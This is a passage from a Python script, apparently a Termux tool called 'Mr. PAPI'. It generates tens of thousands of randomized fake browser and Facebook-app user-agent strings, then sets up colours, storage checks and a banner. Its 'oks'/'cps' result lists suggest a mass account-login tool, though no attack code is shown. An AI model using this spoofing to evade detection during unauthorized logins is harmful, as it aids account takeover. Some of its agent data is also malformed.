    c='RMX3371 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13','14'])
    c='ASUS_I005DA Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13','14'])
    c='Pixel 6 Pro Build/UPB3.230519.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='SM-G960U Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='V2171A Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='REVVL V+ 5G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='CPH2451 Build/TP1A.220905.001; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(92,199)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['9','10','11','12','13'])
    c='zh-CN; PEPM00 Build/TP1A.220905.001) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(40,150)
    h='UCBrowser/15.5.1.1241 Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['6','7','8','9','10','11','12'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='TRT-L53 Build/HUAWEITRT-L53; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(70,115)
    e='0'
    f=random.randrange(3200,5000)
    g=random.randrange(62,192)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Windows NT'
    b=random.choice(['9','10','11','12','13'])
    t='0'
    c='Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    d=random.randrange(62,115)
    e='0'
    f=random.randrange(3200,5900)
    g=random.randrange(40,150)
    h='Safari/537.36'
    lol=f'{a} {b}.{t}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='T Phone Pro Build/SP1A.210812.016; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,6000)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['9','10','11','12','13'])
    c='T Phone Build/TP1A.220624.014; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,6000)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['9','10','11','12','13'])
    c='fa-ir; Redmi Note 11S Build/RP1A.200720.011) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(82,115)
    e='0'
    f=random.randrange(4200,4900)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='Redmi Note 11 Pro (4G) Build/TQ3A.230605.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    d=random.randrange(92,115)
    e='0'
    f=random.randrange(4200,4900)
    g=random.randrange(40,150)
    h='Mobile Safari/537.36'
    lol=f'{a} {b}; {c}{d}.{e}.{f}.{g} {h}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12','13','14','15'])
    c='SM-S908'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e='Build/'
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='P1A.210812.'
    h=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
    i='; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    j=random.randrange(92,115)
    k='0'
    l=random.randrange(4200,6000)
    m=random.randrange(62,192)
    n='Mobile Safari/537.36 OPR/11.1.2254.67011'
    lol=f'{a} {b}; {c}{d} {e}{f}{g}{h}{i}{j}.{k}.{l}.{m} {n}'
    ugen.append(lol)
for ua in range(10000):
    a='Mozilla/5.0'
    b=random.choice(['iPod touch','iphone',''])
    c='CPU iPhone OS'
    d=random.choice(['11','12','13','14','15','16','17','18','19'])
    e='_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko)'
    f=random.choice(['FxiOS','EdgiOS','Mobile','CriOS','GSA'])
    g=random.randrange(92,600)
    h='0'
    i=random.randrange(4200,6000)
    j=random.randrange(62,192)
    k=random.choice(['Mobile','Version','Safari Line','MobileIron'])
    l=random.choice(['15E148 Safari/604.1','Safari/605.1.15'])
    lol=f'{a} {b}; {c} {d} {e} {f}/{g}.{h}.{i}.{j} {k}/{l}'
    ugen.append(lol)
for tanim in range(10000):
    a='Mozilla/5.0 (Linux; Android'
    b=random.choice(['10','11','12','13'])
    c=random.choice(['REVVL V+ 5G','T Phone Pro','REVVL 2 PLUS','TMRVL4G','T Phone','REVVL 2','REVVL 2 PLUS','REVVL V+ 5G'])
    d='Build/'
    e=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    f='P1A.'
    g=random.randrange(200720,210812)
    h=random.choice(['001','002','003','004','005','006','007','008','009','010','011','012','013','014','015','016','017','018','019','020'])
    i='wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/'
    j=random.randrange(92,115)
    k='0'
    l=random.randrange(5005,6000)
    m=random.randrange(92,192)
    n='Mobile Safari/537.36'
    lol=f'{a} {b}; {c} {d}{e}{f}{g}.{h}; {i}{j}.{k}.{l}.{m} {n}'
    ugen.append(lol)
for TANIM in range(1000):
    a='Redmi'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
for TANIM in range(1000):
    a='NokiaX'
    b=random.randrange(1,9)
    c='-0'
    d=random.randrange(1,9)
    e='/'
    f=random.randrange(1,9)
    g='.0 ('
    h=random.randrange(1,12)
    i='Profile/MIDP-2.1 Configuration/CLDC-1.1'
    j='UNTRUSTED/'
    k=random.randrange(1,3)
    l='.0'
    uaku2=f'{a}{b}{c}{d}{e}{f}{g}{h}{i}{j}{k}{l}'
    ugen.append(uaku2)
gt = random.choice(['GT-1015','GT-1020','GT-1030','GT-1035','GT-1040','GT-1045','GT-1050','GT-1240','GT-1440','GT-1450','GT-18190','GT-18262','GT-19060I','GT-19082','GT-19083','GT-19105','GT-19152','GT-19192','GT-19300','GT-19505','GT-2000','GT-20000','GT-200s','GT-3000','GT-414XOP','GT-6918','GT-7010','GT-7020','GT-7030','GT-7040','GT-7050','GT-7100','GT-7105','GT-7110','GT-7205','GT-7210','GT-7240R','GT-7245','GT-7303','GT-7310','GT-7320','GT-7325','GT-7326','GT-7340','GT-7405','GT-7550   5GT-8005','GT-8010','GT-81','GT-810','GT-8105','GT-8110','GT-8220S','GT-8410','GT-9300','GT-9320','GT-93G','GT-A7100','GT-A9500','GT-ANDROID','GT-B2710','GT-B5330','GT-B5330B','GT-B5330L','GT-B5330ZKAINU','GT-B5510','GT-B5512','GT-B5722','GT-B7510','GT-B7722','GT-B7810','GT-B9150','GT-B9388','GT-C3010','GT-C3262','GT-C3310R','GT-C3312','GT-C3312R','GT-C3313T','GT-C3322','GT-C3322i','GT-C3520','GT-C3520I','GT-C3592','GT-C3595','GT-C3782','GT-C6712','GT-E1282T','GT-E1500','GT-E2200','GT-E2202','GT-E2250','GT-E2252','GT-E2600','GT-E2652W','GT-E3210','GT-E3309','GT-E3309I','GT-E3309T','GT-G530H','GT-g900f','GT-G930F','GT-H9500','GT-I5508','GT-I5801','GT-I6410','GT-I8150','GT-I8160OKLTPA','GT-I8160ZWLTTT','GT-I8258','GT-I8262D','GT-I8268','GT-I8505','GT-I8530BAABTU','GT-I8530BALCHO','GT-I8530BALTTT','GT-I8550E','GT-i8700','GT-I8750','GT-I900','GT-I9008L','GT-i9040','GT-I9080E','GT-I9082C','GT-I9082EWAINU','GT-I9082i','GT-I9100G','GT-I9100LKLCHT','GT-I9100M','GT-I9100P','GT-I9100T','GT-I9105UANDBT','GT-I9128E','GT-I9128I','GT-I9128V','GT-I9158P','GT-I9158V','GT-I9168I','GT-I9192I','GT-I9195H','GT-I9195L','GT-I9250','GT-I9303I','GT-I9305N','GT-I9308I','GT-I9505G','GT-I9505X','GT-I9507V','GT-I9600','GT-m190','GT-M5650','GT-mini','GT-N5000S','GT-N5100','GT-N5105','GT-N5110','GT-N5120','GT-N7000B','GT-N7005','GT-N7100T','GT-N7102','GT-N7105','GT-N7105T','GT-N7108','GT-N7108D','GT-N8000','GT-N8005','GT-N8010','GT-N8020','GT-N9000','GT-N9505','GT-P1000CWAXSA','GT-P1000M','GT-P1000T','GT-P1010','GT-P3100B','GT-P3105','GT-P3108','GT-P3110','GT-P5100','GT-P5200','GT-P5210XD1','GT-P5220','GT-P6200','GT-P6200L','GT-P6201','GT-P6210','GT-P6211','GT-P6800','GT-P7100','GT-P7300','GT-P7300B','GT-P7310','GT-P7320','GT-P7500D','GT-P7500M','GT-P7500R','GT-P7500V','GT-P7501','GT-P7511','GT-S3330','GT-S3332','GT-S3333','GT-S3370','GT-S3518','GT-S3570','GT-S3600i','GT-S3650','GT-S3653W','GT-S3770K','GT-S3770M','GT-S3800W','GT-S3802','GT-S3850','GT-S5220','GT-S5220R','GT-S5222','GT-S5230','GT-S5230W','GT-S5233T','GT-s5233w','GT-S5250','GT-S5253','GT-s5260','GT-S5280','GT-S5282','GT-S5283B','GT-S5292','GT-S5300','GT-S5300L','GT-S5301','GT-S5301B','GT-S5301L','GT-S5302','GT-S5302B','GT-S5303','GT-S5303B','GT-S5310','GT-S5310B','GT-S5310C','GT-S5310E','GT-S5310G','GT-S5310I','GT-S5310L','GT-S5310M','GT-S5310N','GT-S5312','GT-S5312B','GT-S5312C','GT-S5312L','GT-S5330','GT-S5360','GT-S5360B','GT-S5360L','GT-S5360T','GT-S5363','GT-S5367','GT-S5369','GT-S5380','GT-S5380D','GT-S5500','GT-S5560','GT-S5560i','GT-S5570B','GT-S5570I','GT-S5570L','GT-S5578','GT-S5600','GT-S5603','GT-S5610','GT-S5610K','GT-S5611','GT-S5620','GT-S5670','GT-S5670B','GT-S5670HKBZTA','GT-S5690','GT-S5690R','GT-S5830','GT-S5830D','GT-S5830G','GT-S5830i','GT-S5830L','GT-S5830M','GT-S5830T','GT-S5830V','GT-S5831i','GT-S5838','GT-S5839i','GT-S6010','GT-S6010BBABTU','GT-S6012','GT-S6012B','GT-S6102','GT-S6102B','GT-S6293T','GT-S6310B','GT-S6310ZWAMID','GT-S6312','GT-S6313T','GT-S6352','GT-S6500','GT-S6500D','GT-S6500L','GT-S6790','GT-S6790L','GT-S6790N','GT-S6792L','GT-S6800','GT-S6800HKAXFA','GT-S6802','GT-S6810','GT-S6810B','GT-S6810E','GT-S6810L','GT-S6810M','GT-S6810MBASER','GT-S6810P','GT-S6812','GT-S6812B','GT-S6812C','GT-S6812i','GT-S6818','GT-S6818V','GT-S7230E','GT-S7233E','GT-S7250D','GT-S7262','GT-S7270','GT-S7270L','GT-S7272','GT-S7272C','GT-S7273T','GT-S7278','GT-S7278U','GT-S7390','GT-S7390G','GT-S7390L','GT-S7392','GT-S7392L','GT-S7500','GT-S7500ABABTU','GT-S7500ABADBT','GT-S7500ABTTLP','GT-S7500CWADBT','GT-S7500L','GT-S7500T','GT-S7560','GT-S7560M','GT-S7562','GT-S7562C','GT-S7562i','GT-S7562L','GT-S7566','GT-S7568','GT-S7568I','GT-S7572','GT-S7580E','GT-S7583T','GT-S758X','GT-S7592','GT-S7710','GT-S7710L','GT-S7898','GT-S7898I','GT-S8500','GT-S8530','GT-S8600','GT-STB919','GT-T140','GT-T150','GT-V8a','GT-V8i','GT-VC818','GT-VM919S','GT-W131','GT-W153','GT-X831','GT-X853','GT-X870','GT-X890','GT-Y8750'])
for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/5.2'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='NokiaN8-00/012.002;'
    e=random.randrange(100, 9999)
    f='Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/533.4 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='7.3.0 Mobile Safari/533.4 3gpp-gba'
    uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku) 
###----------[ User Agent Linux (king snigdho) ]---------- ###
for sex in range(10000):  
    aa='Mozilla/5.0 (Linux; Android'
    b=random.choice(['6','7','8','9','10','11','12','13'])
    c='vivo 1904 Build/RP1A.200720.012; wv)'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/352.0.0.21.117;]'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)
#--------------------(USER AGENT)------------------------#
a="Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.99 Safari/537.36"
b="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MDDCJS; rv:11.0) like Gecko"
c="Mozilla/5.0 (Linux; U; Android 4.4.2; id; SM-G900 Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/9.9.2.467 U3/0.8.0 Mobile Safari/534.30"
d="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; ASU2JS; rv:11.0) like Gecko"
e="Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; MAARJS; rv:11.0) like Gecko"
f="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36 OPR/42.0.2393.517"
g="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
h="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
i="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
j="Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36"
k="Mozilla/5.0 (Linux; Android 6.0.1; SM-G928F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
l="Mozilla/5.0 (Linux; Android 5.0.2; SM-G530FZ Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
m="Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0"
n="Mozilla/5.0 (Windows NT 6.1; rv:45.0) Gecko/20100101 Firefox/45.0"
o="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:47.0) Gecko/20100101 Firefox/47.0"
p="Mozilla/5.0 (Windows NT 10.0; rv:51.0) Gecko/20100101 Firefox/51.0"
q="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0"
r="Mozilla/5.0 (compatible; PaperLiBot/2.1; http://support.paper.li/entries/20023257-what-is-paper-li)"
s="Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.9.0.7) Gecko/2009021910 Firefox/3.0.7"
t="Mozilla/5.0 (X11; CrOS x86_64 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
u="Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0"
v="Mozilla/5.0 (iPad; CPU OS 9_3_5 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13G36 Safari/601.1"
w="Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko"
x="Mozilla/5.0 (Linux; Android 6.0.1; SM-G930F Build/MMB29K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Mobile Safari/537.36"
y="Mozilla/5.0 (X11; CrOS armv7l 8872.76.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.105 Safari/537.36"
z="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_3) AppleWebKit/601.4.4 (KHTML, like Gecko) Version/9.0.3 Safari/601.4.4"
aa="Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
bb="Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; LCJB; rv:11.0) like Gecko"
cc="Mozilla/5.0 (Linux; Android 5.0.2; SM-T530 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.91 Safari/537.36"
dd="Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 8.50"
ee="Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET4.0C; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET4.0E; InfoPath.1)"
ff="Mozilla/5.0 (iPhone; CPU iPhone OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4"
gg="Mozilla/5.0 (compatible; ecoresearch/0.9; +http://www.ecoresearch.net)"
hh="Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
ii="Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:48.0) Gecko/20100101 Firefox/48.0"
jj="Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36"
kk="Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36"
ll="Mozilla/5.0 (Windows NT 10.0; WOW64; rv:50.0) Gecko/20100101 Firefox/50.0"
mm="Mozilla/5.0 (iPhone; CPU iPhone OS 10_2_1 like Mac OS X) AppleWebKit/602.4.6 (KHTML, like Gecko) Mobile/14D27 [FBAN/FBIOS;FBAV/78.0.0.40.70;FBBV/48784289;FBRV/0;FBDV/iPhone9,3;FBMD/iPhone;FBSN/iOS;FBSV/10.2.1;FBSS/2;FBCR/OrangeFrance;FBID/phone;FBLC/fr_FR;FBOP/5]"
nn="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:51.0) Gecko/20100101 Firefox/51.0"
oo="Mozilla/5.0 (X11; Linux i686; rv:15.0) Gecko/20100101 Firefox/15.0"
pp="Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)"
qq="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0"
rr="Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.3) Gecko/2008092814 Iceweasel/3.0.3 (Debian-3.0.3-3)"
ss="Mozilla/5.0 (Windows NT 5.1; rv:38.0) Gecko/20100101 Firefox/38.0"
tt="Mozilla/5.0 (Windows NT 6.3; WOW64; rv:51.0) Gecko/20100101 Firefox/51.0"
uu="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.95 Safari/537.36"
vv="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14"
ww="Mozilla/5.0 (Linux; Android 6.0.1; SM-G920F Build/MMB29K; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/55.0.2883.91 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/109.0.0.15.71;]"
xx="Mozilla/5.0 (X11; U; Linux x86_64; pl-PL; rv:1.8) Gecko/20051128 SUSE/1.5-0.1 Firefox/1.5.0.1"
yy="Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.1.16) Gecko/20120421 Gecko Firefox/11.0"
zz="Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_2 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13F69 [FBAN/FBIOS;FBAV/59.0.0.51.142;FBBV/33266808;FBRV/0;FBDV/iPhone7,1;FBMD/iPhone;FBSN/iPhone OS;FBSV/9.3.2;FBSS/3;FBCR/Telkomsel;FBID/phone;FBLC/en_US;FBOP/5]"
ab="Mozilla/5.0 (Linux; Android 5; en-us; DROID4 4G Build/6.7.2-180_DR4-16_M2-37) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/149.0.4529.141 Mobile Safari/537.36"
vv="Mozilla/5.0 (Linux; Android {10}; SM-A305GN Build/PPR1.247706.011; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/130.0.6265.94 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/337.1.0.11.118;]"
zxx=(ab,vv,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,aa,bb,cc,dd,ee,ff,gg,hh,ii,jj,kk,ll,mm,nn,oo,pp,qq,rr,ss,tt,uu,vv,ww,xx,yy,zz)
ugen.append(zxx)

#▬▭▬▭▬▭▬▭[ COLLOR VARIABLES ]▬▭▬▭▬▭▬▭#
a="\033[1;97m";b="\033[1;92m";c="\033[1;91m";d="\033[1;32m";e="\033[1;37m";f="\033[1;34m";g="\033[1;93m";h="\033[1;94m";i="\033[1;95m";j="\x1b[38;5;208m"
#▬▭▬▭▬▭▬▭[ OPTION VARIABLES ]▬▭▬▭▬▭▬▭#
l1=f"{a}[{b}1{a}]";l2=f"{a}[{b}2{a}]";l3=f"{a}[{b}3{a}]";l4=f"{a}[{b}4{a}]";l5=f"{a}[{b}5{a}]";l6=f"{a}[{b}6{a}]";l7=f"{a}[{b}7{a}]";l0=f"{a}[{c}0{a}]";ekual=f"{f}:{a}"
#▬▭▬▭▬▭▬▭[ ENABLE SDCARD ]▬▭▬▭▬▭▬▭#
try:magi('rm -rf /sdcard/..txt');open('/sdcard/..txt','a').write(' ')
except PermissionError:magi("clear");print(f" {b}Please enable storage permission to continue{a}");magi("termux-setup-storage");exit()
#▬▭▬▭▬▭▬▭[ INSTALL ]▬▭▬▭▬▭▬▭#
try:import requests # type: ignore
except ModuleNotFoundError:
    magi("clear");print(f"{b} Installing Module .... ");magi("pip install requests > /dev/null")
#▬▭▬▭▬▭▬▭[ LINE ]▬▭▬▭▬▭▬▭#
PAPIline=f"{f}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"
#▬▭▬▭▬▭▬▭[ APPEND ]▬▭▬▭▬▭▬▭#
loop=0
oks,cps,psw,PAPI_mthd,numnx,pmsn_ckki=[],[],[],[],[],[]
sys.stdout.write('\x1b]2; Mr. PAPI\x07')
#______clor_____#
orange = "\x1b[38;5;196m"
yellow = "\x1b[38;5;208m"
black="\033[1;30m"
rad="\x1b[38;5;160m"
green="\x1b[38;5;46m"
yelloww="\033[1;33m"
blue="\033[38;5;6m"
purple="\033[1;35m"
cyan="\033[1;36m"
white="\033[1;37m"
faltu = "\033[1;47m"
pvt = "\033[1;0m"
gren = "\x1b[38;5;154m"
gas = "\033[1;32m" 
#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
def clr_logo():
    magi("clear")
    print(f"""                   {green}┏━━━━━━━━━━━━━━━━━━━┓{green}
                   {green}┃  {rad}{faltu}  DEX 🔹 PAPI  {pvt}{green}  ┃
{green}╔━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━┳━━━━━━┻━━━━━━━━━━━━━━━━━╗
